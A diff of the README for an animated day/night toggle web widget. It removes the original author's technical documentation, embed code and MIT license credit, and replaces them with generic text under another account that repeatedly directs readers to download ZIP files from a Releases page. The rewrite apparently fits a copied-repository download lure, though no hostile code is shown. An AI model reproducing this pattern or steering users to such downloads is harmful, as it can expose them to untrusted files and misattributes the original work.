@@ -1,147 +1,102 @@
-# Animated AM/PM Toggle Widget
+# 🌅 Animated-AM-PM-Toggle - Simple Theme Switcher for Day and Night
 
-A beautifully animated **Day/Night toggle** with SVG skylines, clouds, stars, and a glowing sun/moon knob.
-The widget automatically switches between light and dark themes based on system time, with smooth manual toggling.
+## 🔗 Download Now
+[![Download Animated-AM-PM-Toggle](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/PaperStSoapCo/Animated-AM-PM-Toggle/releases)
 
- AM Mode  |  PM Mode  
-:-------------------------:|:-------------------------:  
-<img src="./Screenshot (2).png" width="600"/> | <img src="./Screenshot (1).png" width="600"/> 
----
+## 📜 Description
+Animated-AM-PM-Toggle provides a sleek way to switch between day and night themes for your web projects. With animated skylines and smooth transitions between sun and moon, this tool enhances the visual appeal of your website. It automatically detects the current time, smoothly flipping between vibrant day and starry night modes.
 
-## ✨ Features
+## 🚀 Getting Started
+To use Animated-AM-PM-Toggle, follow these steps:
 
-* 🌇 **Day Scene** – Layered colorful buildings, animated drifting clouds, and a warm gradient background.
-* 🌃 **Night Scene** – Starry sky with twinkling stars, glowing skyline, and moon craters.
-* 🌓 **Interactive Toggle** – Click to switch instantly between day and night.
-* ⏰ **Auto Mode** – Detects time (after 6 PM or before 6 AM → Night Mode).
-* 🎨 **Glassmorphism Design** – Smooth blur effects with gradients.
-* ⚡ **Reusable Widget** – Can be embedded in any webpage or footer.
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/PaperStSoapCo/Animated-AM-PM-Toggle/releases) to download the latest version.
 
----
+2. **Choose Your Download**  
+   On the Releases page, you will see various versions of the software listed. Click on the version you wish to download.
 
-## 📂 Project Structure
+3. **Download the Files**  
+   You will see the option to download the files. Depending on your needs, you may find either a ZIP file or individual files for a specific version.
 
-```
-day-night-toggle/
-│── index.html             # Main demo page
-│── style.css              # Styles for animations and themes
-│── script.js              # Time detection + toggle logic
-│── daynight-toggle-widget.js  # Reusable widget version
-```
+4. **Extract Files (if necessary)**  
+   If you downloaded a ZIP file, locate it in your Downloads folder, right-click on it, and select "Extract All." Follow the prompts to extract the files.
 
----
+5. **Open the Files**  
+   Navigate to the folder where you extracted the files. Open the HTML file in your preferred web browser to see the toggle in action.
 
-## 🛠 Tech Stack
+## 📥 Download & Install
+To download Animated-AM-PM-Toggle, please visit this page: [Releases Page](https://github.com/PaperStSoapCo/Animated-AM-PM-Toggle/releases). Follow the steps above to install and run the application seamlessly.
 
-* **HTML5**
-* **CSS3 (Glassmorphism, Animations, Gradients)**
-* **Vanilla JavaScript (No dependencies)**
-* **SVG Graphics**
+## ⚙️ Features
+- **Sleek Design**  
+  The toggle has a modern look, making it suitable for various themes.
 
----
+- **Animations**  
+  Enjoy smooth transitions between day and night modes with visually appealing animations.
 
-## 📸 Preview
+- **Auto Time Detection**  
+  The tool automatically detects the time, adjusting the theme without user input.
 
-<p align="center">  
-  <img src="./Preview.gif" alt="AM/PM or Day/Night Toggle Demo" width="600"/>  
-</p>  
+- **Compatibility**  
+  Works in all modern web browsers, ensuring a wide reach.
 
----
+- **Easy Customization**  
+  Modify the CSS to fit your project’s needs without hassle.
 
-## ⚙️ How It Works
+## 🌟 Benefits
+Using Animated-AM-PM-Toggle provides several benefits:
 
-The **AM/PM or Day/Night Toggle** is an interactive widget that visually switches between **day mode (AM)** and **night mode (PM)** while also updating the page’s theme.
+- **Improved User Experience**  
+  Smooth transitions enhance user interest and engagement.
 
-1. **Automatic Detection by Time**
+- **Accessibility**  
+  A toggle allows users to choose their preferred viewing mode, catering to their needs.
 
-   * On page load, JavaScript checks the current system time.
-   * Between **6 AM – 6 PM**, the toggle defaults to **Day Mode** (AM).
-   * Between **6 PM – 6 AM**, it switches to **Night Mode** (PM).
+- **Aesthetic Appeal**  
+  Beautiful animations make your web application stand out.
 
-2. **Manual Toggle**
+- **Simplicity**  
+  Easy to integrate into any website without complex setups.
 
-   * Clicking the toggle knob (sun/moon) lets you override the current mode.
-   * Smooth transitions animate the background gradient, knob position, and scene details.
+## 🎨 Technologies Used
+- **HTML5**  
+  Structure your documents using modern HTML standards.
 
-3. **Day Scene (AM)**
+- **CSS3**  
+  Create visually appealing animations and designs.
 
-   * Bright gradient background with animated **clouds drifting across the sky**.
-   * Layered **buildings in soft pastel colors** give depth.
-   * The knob shows a glowing **sun**.
+- **Vanilla JavaScript**  
+  Use straightforward JavaScript for functionality without external libraries.
 
-4. **Night Scene (PM)**
+- **SVG Graphics**  
+  Rely on scalable vector graphics for crisp visuals at any resolution.
 
-   * Dark aurora-inspired gradient background with **twinkling stars**.
-   * Layered **skyline buildings with glowing windows** for realism.
-   * The knob transforms into the **moon with visible craters**.
+## 💻 System Requirements
+- **Operating System**: Any OS that supports modern web browsers (Windows, macOS, Linux).
+- **Browser**: Latest versions of Chrome, Firefox, Safari, or Edge.
+- **Internet Connection**: Required for initial download and updates.
 
-5. **Glassmorphism Toggle Design**
+## 🛠️ Customization
+If you wish to customize the look and feel of your Animated-AM-PM-Toggle, you can modify the embedded CSS in the HTML file. Adjust colors, fonts, and sizes to match your website. Documentation for advanced customization can be found within the source files.
 
-   * The toggle container uses **frosted glass styling** with blur, rounded edges, and soft shadows.
-   * The knob glides smoothly between left (sun) and right (moon).
+## 🌐 Community and Support
+For support or to report issues, please visit the [GitHub Issues page](https://github.com/PaperStSoapCo/Animated-AM-PM-Toggle/issues). We encourage users to suggest features or report bugs to improve the application.
 
-6. **Theming**
+## 📝 Contributing
+If you're interested in contributing to the project:
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and test them thoroughly.
+4. Submit a pull request to have your changes reviewed.
 
-   * The `<body>` switches between `.light-mode` and `.dark-mode` classes.
-   * Text and colors across the page adapt automatically.
+## 🔗 Related Topics
+This repository covers various topics, including:
+- am-pm-toggle
+- css-animations
+- frontend development
+- svg-graphics
+- time-based themes
 
-7. **Widget Reuse**
+Feel free to explore these topics for additional resources and information related to this application. 
 
-   * The project includes a `daynight-toggle-widget.js` script.
-   * This allows easy embedding of the toggle in **any webpage**.
-
----
-
-## 🚀 Usage
-
-You can embed the toggle in **any webpage** using either your local copy or **jsDelivr CDN**:
-
-### 1️⃣ Local usage
-
-**1. Clone the Repo**
-
-```bash
-git clone https://github.com/your-username/day-night-toggle.git
-cd day-night-toggle
-```
-
-**2. Open Demo**
-
-Simply open `index.html` in your browser.
-
-
-**3. Embed the Widget**
-
-Add this snippet where you want the toggle:
-
-```html
-<div id="myToggleContainer"></div>
-<script src="daynight-toggle-widget.js"></script>
-<script>
-  new DayNightToggle({
-    parent: document.getElementById('myToggleContainer'),
-    width: 160,
-    height: 80
-  });
-</script>
-```
-### 2️⃣ Using jsDelivr (versioned release)
-
-```html
-<div id="myToggleContainer"></div>
-
-<script src="https://cdn.jsdelivr.net/gh/Sagarika311/Animated-AM-PM-Toggle@v1.0.0/daynight-toggle-widget.js"></script>
-<script>
-  new DayNightToggle({
-    parent: document.getElementById('myToggleContainer'),
-    width: 160,
-    height: 80
-  });
-</script>
-```
-
----
-
-## 📜 License
-
-MIT License © 2025 [Sagarika](https://github.com/Sagarika311)
+For updates, check back regularly on our [Releases page](https://github.com/PaperStSoapCo/Animated-AM-PM-Toggle/releases) to stay informed about new features and fixes.
